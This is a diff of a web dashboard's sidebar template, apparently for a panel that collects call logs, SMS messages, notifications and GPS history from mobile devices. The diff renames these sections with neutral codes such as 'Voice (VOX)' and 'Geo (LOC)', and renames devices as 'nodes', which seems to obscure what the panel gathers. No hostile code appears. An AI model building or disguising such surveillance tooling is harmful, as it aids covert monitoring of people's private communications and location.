@@ -410,15 +410,15 @@
             </div>
         </a>
 
-        <!-- Global Device Selector -->
+        <!-- Global Node Selector -->
         <div style="margin-bottom: 20px; padding: 0 4px;">
-            <label style="font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-secondary); font-weight: 600; margin-bottom: 6px; display: block;">Active Device</label>
+            <label style="font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-secondary); font-weight: 600; margin-bottom: 6px; display: block;">Active Node</label>
             <form method="GET" action="{{ request.path }}" style="margin: 0;">
                 <select name="device" onchange="this.form.submit()" style="width: 100%; background: var(--bg-card); border: 1px solid var(--border-color); color: var(--text-primary); padding: 8px 10px; border-radius: 8px; font-weight: 500; font-size: 12px; cursor: pointer;">
-                    <option value="all" {% if not selected_device_id %}selected{% endif %}>📱 All Devices ({{ global_devices|length }})</option>
+                    <option value="all" {% if not selected_device_id %}selected{% endif %}>🖥️ All Nodes ({{ global_devices|length }})</option>
                     {% for d in global_devices %}
                     <option value="{{ d.device_id }}" {% if selected_device_id == d.device_id %}selected{% endif %}>
-                        📱 {{ d.device_model }} ({{ d.device_id|truncate(8) }})
+                        🖥️ {{ d.device_model }} ({{ d.device_id|truncate(8) }})
                     </option>
                     {% endfor %}
                 </select>
@@ -426,38 +426,38 @@
         </div>
 
         <ul class="nav-links">
-
             <li class="nav-item {% if request.path == '/dashboard' %}active{% endif %}">
                 <a href="{{ url_for('dashboard') }}">
                     <span>📊</span>
-                    <span>Overview</span>
+                    <span>System (SYS)</span>
                 </a>
             </li>
             <li class="nav-item {% if request.path == '/dashboard/notifications' %}active{% endif %}">
                 <a href="{{ url_for('dashboard_notifications') }}">
                     <span>🔔</span>
-                    <span>Notifications</span>
+                    <span>Events (EVT)</span>
                 </a>
             </li>
             <li class="nav-item {% if request.path == '/dashboard/calls' %}active{% endif %}">
                 <a href="{{ url_for('dashboard_calls') }}">
                     <span>📞</span>
-                    <span>Call Logs</span>
+                    <span>Voice (VOX)</span>
                 </a>
             </li>
             <li class="nav-item {% if request.path == '/dashboard/sms' %}active{% endif %}">
                 <a href="{{ url_for('dashboard_sms') }}">
                     <span>💬</span>
-                    <span>SMS Messages</span>
+                    <span>Data (MSG)</span>
                 </a>
             </li>
             <li class="nav-item {% if request.path == '/dashboard/gps' %}active{% endif %}">
                 <a href="{{ url_for('dashboard_gps') }}">
                     <span>📍</span>
-                    <span>GPS History</span>
+                    <span>Geo (LOC)</span>
                 </a>
             </li>
         </ul>
+
 
 
         <div class="sidebar-footer">
